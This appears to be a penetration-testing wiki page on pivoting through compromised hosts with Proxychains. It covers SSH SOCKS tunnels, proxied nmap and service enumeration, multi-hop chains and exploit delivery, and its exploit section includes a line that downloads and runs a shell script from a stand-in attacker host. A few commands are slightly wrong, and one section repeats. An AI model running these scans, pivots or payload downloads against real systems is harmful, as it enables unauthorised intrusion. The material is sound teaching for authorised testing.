---
description: Pivoting using Proxychains
---

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents. You accept full responsibility for your actions by applying any knowledge gained here.
{% endhint %}

# Proxychains

Proxychains is a tool that forces TCP/UDP connections made by any program to go through one or more SOCKS proxies. It's essential for red team operations to pivot through compromised systems and access systems on internal networks.

## Installation

### Linux/Debian-based systems

```bash
apt install proxychains4

# Or from source for latest version
git clone https://github.com/rofl0r/proxychains-ng.git
cd proxychains-ng
./configure --prefix=/usr --exec-prefix=/usr --libdir=/usr/lib/x86_64-linux-gnu
make
sudo make install
```

### Verify installation

```bash
which proxychains
proxychains --version
```

## Advantages

* **Transparent SOCKS proxying** - Works with any TCP application without modification
* **Flexible configuration** - Easy to chain multiple proxies
* **Minimal setup** - Only requires SSH access to a compromised system
* **Stealthy** - Appears as legitimate traffic from the pivot host's perspective
* **No agent required** - Doesn't need installation of additional software on target
* **Dynamic SSH tunnels** - Can establish tunnels on-the-fly without opening additional ports
* **Supports chaining** - Can pivot through multiple systems sequentially
* **Environment variable control** - Can specify proxy configuration via environment variables instead of editing files

## Disadvantages

* **Slow performance** - Proxying adds significant latency and reduces bandwidth
* **Timeout issues** - Connections may timeout on slow networks; requires tuning
* **DNS resolution problems** - May leak DNS queries or require specific handling
* **Application compatibility** - Some applications work poorly through SOCKS proxies
* **Noise and detection** - Extensive proxying can generate suspicious traffic patterns
* **UDP limitations** - SOCKS5 UDP support varies; SOCKS4 doesn't support UDP at all
* **No encryption over SOCKS layer** - Must use encrypted tunnel (SSH) for confidentiality
* **Error handling** - Application errors through proxies can be difficult to debug

## Basic Proxychains Setup and Usage

### Step 1: Establish SSH Dynamic Port Forward

From your attacker machine, create a SOCKS proxy tunnel through an SSH connection:

```bash
# Basic syntax
ssh -D <local_port> <user>@<pivot_host>

# Example
ssh -D 1080 user@10.10.10.100

# Without spawning interactive shell (background)
ssh -fN -D 1080 user@10.10.10.100

# With connection persistence
ssh -fN -D 1080 -o ConnectTimeout=10 -o ServerAliveInterval=60 user@10.10.10.100
```

**Parameters:**
- `-D`: Allocate a SOCKS proxy port  
- `-f`: Go to background after authentication
- `-N`: Don't execute remote command (just forward ports)

### Step 2: Configure Proxychains

Edit `/etc/proxychains.conf` to specify the SOCKS proxy:

```conf
# Strict - each proxy must be reachable
# Random - proxies are used randomly
# Dynamic - proxies can be down dynamically
strict_chain
#random_chain
#dynamic_chain

# timeout in ms
tcp_read_time_out 4000
tcp_connect_time_out 5000

# Reduce these for faster connections through slow networks
# tcp_read_time_out 800
# tcp_connect_time_out 800

# ProxyList format
#       type  ip            port [user [pass]]
[ProxyList]
socks5  127.0.0.1  1080

# For SOCKS4 (older, less reliable)
# socks4  127.0.0.1  1080
```

### Step 3: Using Proxychains

```bash
# Any command prefixed with proxychains will tunnel through the proxy
proxychains nmap -p 80,443 10.10.20.0/24
proxychains ssh -u admin 10.10.20.50
proxychains curl http://10.10.20.30
```

## Remote Network Enumeration through Proxychains

### Host Discovery

Layer 2 traffic such as arp and ICMP will not traverse a SOCKS proxy, and therefor cannot be used through proxychains.

```bash
# TCP-based host discovery with nmap (slow but reliable)
proxychains nmap -sT -Pn -p 22,80,443,445 --open -n 10.10.20.0/24
```

### Port Scanning through Proxychains

**Important:** Port scanning through proxychains is VERY SLOW. Optimization is critical.

**Basic port scan:**
```bash
# Full port scan (extremely slow, not recommended)
proxychains nmap -sT -Pn -p- 10.10.20.50

# Top ports only (faster)
proxychains nmap -sT -Pn --top-ports 100 --open 10.10.20.50

# Specific ports (recommended)
proxychains nmap -sT -Pn -p 22,80,443,445,3306,5432 10.10.20.50
```

**Optimized parallel scanning with xargs:**

The key to speed is parallelization - scan multiple ports simultaneously:

```bash
# Scan ports 1-1000 in parallel (50 threads)
seq 1 1000 | xargs -P 50 -I{} proxychains -q nmap -p {} -sT -Pn --open -n \
  --min-parallelism 100 --min-rate 1 -oG results.txt --append-output 10.10.20.50

# Scan top 1000 ports on multiple hosts
seq 1 254 | xargs -P 20 -I{} proxychains -q nmap -sT -Pn --top-ports 100 \
  --open -n 10.10.20.{} -oG results.txt --append-output

# Parse results
grep "Ports" results.txt | grep -v "filtered"
```

### Service Enumeration

```bash
# Enumerate well-known services
proxychains nmap -sT -Pn -p 22,80,443,445,3389,3306,5432,5900 -sV 10.10.20.50

# Web service enumeration
proxychains curl -v http://10.10.20.50
proxychains wget http://10.10.20.50/index.html

# SMB enumeration (Windows networks)
proxychains smbclient -L //10.10.20.50 -N
proxychains enum4linux 10.10.20.50

# SSH enumeration
proxychains ssh -v user@10.10.20.50

# Database enumeration
proxychains mysql -h 10.10.20.50 -u root
proxychains psql -h 10.10.20.50 -U postgres
```

## Exploit Delivery through Proxychains

### Method 1: Using Metasploit with Proxychains

Configure Metasploit to use SOCKS proxy:

```bash
# Start msfconsole and set proxies
msfconsole
msf> setg Proxies SOCKS5:127.0.0.1:1080

# Or use command line
proxychains -q msfconsole -x "setg Proxies SOCKS5:127.0.0.1:1080; use exploit/..."
```

### Method 2: Direct Exploit Execution

Execute exploits directly through proxychains:

```bash
# Python exploit
proxychains python exploit.py -t 10.10.20.50 -p 445

# Ruby exploit
proxychains ruby exploit.rb --target 10.10.20.50 --port 80

# Bash/system commands
proxychains bash -i -c "wget http://attacker.com/shell.sh -O /tmp/s.sh && bash /tmp/s.sh"
```

### Method 3: File Upload and Command Execution

```bash
# Write to writable shares
proxychains smbclient //10.10.20.50/share -N
# smb > put exploit.exe
# smb > quit
# Then execute via lateral movement (PsExec, etc)
```

## Advanced Proxychains Techniques

### Multiple Proxy Chains (Double/Triple Pivot)

Chain multiple proxies to traverse multiple network segments:

```bash
# First pivot: Establish SOCKS through first compromised system
ssh -fN -D 1080 user@10.10.10.100

# Second pivot: Establish SOCKS through target accessed via first proxy
proxychains ssh -fN -D 1081 user@10.10.20.50

# Configure /etc/proxychains.conf for second proxy
# [ProxyList]
# socks5  127.0.0.1  1081

# Now enumerate third network
proxychains nmap -sT -Pn --top-ports 20 10.10.30.0/24
```

**Bash script for managing multiple proxies:**

```bash
#!/bin/bash
# multi_pivot.sh - Manage multiple SSH tunnels and proxychains

declare -A pivots=(
  [network1]="user@10.10.10.100:1080"
  [network2]="user@10.10.20.50:1081"
)

for net in "${!pivots[@]}"; do
  IFS=':' read -r host port <<< "${pivots[$net]}"
  echo "[*] Establishing pivot to $net on port $port"
  ssh -fN -D $port $host
done

echo "[+] All pivots established. Configure proxychains and use:"
echo "    proxychains <command>"
```

### Dynamic SOCKS Configuration via Environment Variables

Instead of editing config files, specify proxy via environment variable:

```bash
# Single proxy
PROXYCHAINS_SOCKS5=127.0.0.1:1080 proxychains nmap -sT -Pn 10.10.20.50

# Switch proxies without editing config
ssh -fN -D 2000 user@10.10.10.100
PROXYCHAINS_SOCKS5=127.0.0.1:2000 proxychains curl http://10.10.20.30

# In new shell with proxy set
export PROXYCHAINS_SOCKS5=127.0.0.1:1080
proxychains zsh  # All commands in this shell use the proxy
```

## Proxychains Configuration

ProxyChains looks for the configuration file in the following order:

1. SOCKS5 proxy port in environment variable `${PROXYCHAINS_SOCKS5}`
2. File listed in environment variable `${PROXYCHAINS_CONF_FILE}`
3. The `-f configfile_name` argument provided to the proxychains command
4. `./proxychains.conf`
5. `$(HOME_DIRECTORY)/.proxychains/proxychains.conf`
6. `/etc/proxychains.conf`

### Specify proxy on command line

Using environment variables eliminates the need to edit config files:

```bash
# Single proxy
PROXYCHAINS_SOCKS5=127.0.0.1:1080 proxychains nmap -sT -Pn 10.10.20.50

# Switch proxies without editing config
ssh -fN -D 2000 user@10.10.10.100
PROXYCHAINS_SOCKS5=127.0.0.1:2000 proxychains curl http://10.10.20.30

# In new shell with proxy set
export PROXYCHAINS_SOCKS5=127.0.0.1:1080
proxychains zsh  # All commands in this shell use the proxy
```

## Optimization for Speed

Proxychains scanning is inherently slow. These techniques improve performance:

### 1. Reduce Timeouts

```conf
# In /etc/proxychains.conf
tcp_read_time_out 800      # Default: 4000ms
tcp_connect_time_out 800   # Default: 5000ms
```

### 2. Use Quiet Mode

```bash
# Suppress verbose output
proxychains -q nmap ...
```

### 3. Parallel Execution with xargs

```bash
# Scan multiple targets in parallel
seq 1 254 | xargs -P 30 -I{} proxychains -q nmap -sT -Pn --top-ports 10 10.10.20.{} &

# Monitor progress
watch "ps aux | grep proxychains"
```

### 4. Limit Port Range

```bash
# Only scan critical ports
proxychains nmap -sT -Pn -p 21,22,23,25,53,80,110,135,139,143,389,445,465,587,636,993,995,1433,3306,3389,5432,5900 10.10.20.0/24
```

### 5. TCP Connect Scan (-sT)

Use only TCP connect scans through proxychains. Stealth scans don't work through SOCKS:

```bash
# Correct
proxychains nmap -sT -Pn 10.10.20.50

# Won't work through SOCKS
proxychains nmap -sS 10.10.20.50  # TCP SYN scan won't work
```

## Common Issues and Troubleshooting

### DNS Resolution Issues

```bash
# DNS may leak or not resolve correctly through SOCKS
# Use IP addresses instead of hostnames when possible
proxychains nmap 10.10.20.50  # Good
proxychains nmap internal.local  # May fail

# Force DNS through proxy
# Edit proxychains.conf:
# proxy_dns

# Or use Tor
```

### Timeout Errors

```bash
# Reduce timeouts further if connections keep timing out
tcp_read_time_out 500
tcp_connect_time_out 500

# Or disable timeouts entirely (not recommended)
# Comment out tcp_* lines
```

### Connection Refused

```bash
# Verify tunnel is open
netstat -tulpn | grep 1080

# Reconnect if needed
ssh -fN -D 1080 user@10.10.10.100 -v  # Verbose for debugging

# Check firewall rules on pivot host
proxychains iptables -L -n
```

### Slow Performance

```bash
# Use minimal nmap options
proxychains nmap -sT -Pn --open 10.10.20.50

# Or use nc for raw port scanning
for port in 80 443 445 22; do
  proxychains nc -zv 10.10.20.50 $port
done
```

## Best Practices

1. **Use background SSH tunnels**: `ssh -fN -D port user@host`
2. **Set appropriate timeouts**: Balance between timeout errors and speed
3. **Scan critical ports only**: Focus on likely vulnerabilities
4. **Use parallel execution**: Leverage xargs for simultaneous scans
5. **Verify tunnel connectivity**: Test tunnel before running scans
6. **Change settings per engagement**: Tune timeouts based on network latency
7. **Document all pivots**: Track which proxies you've established
8. **Clean up tunnels**: Kill SSH processes when done pivoting
9. **Monitor for detection**: Excessive proxychains traffic may trigger alerts
10. **Have backup pivots**: Establish multiple tunnels for reliability

## References

* [Proxychains-ng GitHub](https://github.com/rofl0r/proxychains-ng)
* [SOCKS Protocol Specification](https://tools.ietf.org/html/rfc1928)
* [https://github.com/haad/proxychains](https://github.com/haad/proxychains)
* [https://materials.rangeforce.com/tutorial/2020/03/16/Proxychains/](https://materials.rangeforce.com/tutorial/2020/03/16/Proxychains/)
* [https://github.com/t3l3machus/pentest-pivoting](https://github.com/t3l3machus/pentest-pivoting)
* [https://www.hackwhackandsmack.com/?p=1021](https://www.hackwhackandsmack.com/?p=1021)
* [https://cyberdefense.orange.com/fr/blog/etat-de-lart-du-pivoting-reseau-en-2019/](https://cyberdefense.orange.com/fr/blog/etat-de-lart-du-pivoting-reseau-en-2019/)
